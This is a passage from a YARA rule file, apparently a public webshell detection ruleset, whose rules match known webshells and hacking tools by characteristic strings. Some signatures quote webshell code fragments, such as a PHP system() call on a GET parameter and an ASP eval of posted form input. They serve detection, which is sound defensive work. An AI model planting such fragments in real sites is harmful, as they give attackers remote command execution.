		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8602-L8614"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		logic_hash = "b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Hiderun
{
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8615-L8627"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		logic_hash = "3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_V1_7
{
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8628-L8639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		logic_hash = "e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Save
{
	meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8640-L8652"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "865da1b3974e940936fe38e8e1964980"
		logic_hash = "c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"

	condition:
		all of them
}

rule SIGNATURE_BASE_Screencap
{
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8653-L8666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		logic_hash = "9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_2
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8667-L8678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxrecv
{
	meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d36541f-dd55-5385-8e2b-598ad78bdf73"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8679-L8696"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
		logic_hash = "7eef63e45f6902e4f2d5f854b2794df3101a2ef145e2d627263db429c2b728d7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8697-L8708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"

	condition:
		all of them
}

rule SIGNATURE_BASE_C99Shell
{
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8709-L8720"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		logic_hash = "a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpspy_2005_Full
{
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8721-L8732"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1c69bb152645438440e6c903bac16b2"
		logic_hash = "8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_2
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8733-L8744"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_2
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8745-L8756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8757-L8770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"

	condition:
		all of them
}

rule SIGNATURE_BASE__Root_040_Zip_Folder_Deploy
{
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8771-L8784"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		logic_hash = "9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}

rule SIGNATURE_BASE_By063Cli
{
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8785-L8797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		logic_hash = "c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."

	condition:
		all of them
}

rule SIGNATURE_BASE_Icyfox007V1_10_Rar_Folder_Asp
{
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8798-L8809"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		logic_hash = "3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_2
{
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8811-L8822"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		logic_hash = "25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"

	condition:
		all of them
}

rule SIGNATURE_BASE_U_Uay
{
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8823-L8835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		logic_hash = "45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Bin_Wuaus
{
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8836-L8852"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		logic_hash = "0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="

	condition:
		all of them
}

rule SIGNATURE_BASE_Pwreveal
{
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8853-L8867"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		logic_hash = "01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Xwhois
{
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8868-L8882"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		logic_hash = "75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_2
{
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8883-L8894"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		logic_hash = "428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Vanquish - DLL injection failed:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Down_Rar_Folder_Down
{
	meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8895-L8906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "db47d7a12b3584a2e340567178886e71"
		logic_hash = "bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cmdshell
{
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8907-L8918"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		logic_hash = "5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Nc
{
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8919-L8933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		logic_hash = "6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portlessinst
{
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8934-L8947"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		logic_hash = "72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Setupbdoor
{
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8948-L8959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "41f89e20398368e742eda4a3b45716b6"
		logic_hash = "b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\SetupBDoor"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_3
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8960-L8972"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		logic_hash = "b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Server
{
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8973-L8989"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		logic_hash = "34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006
{
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
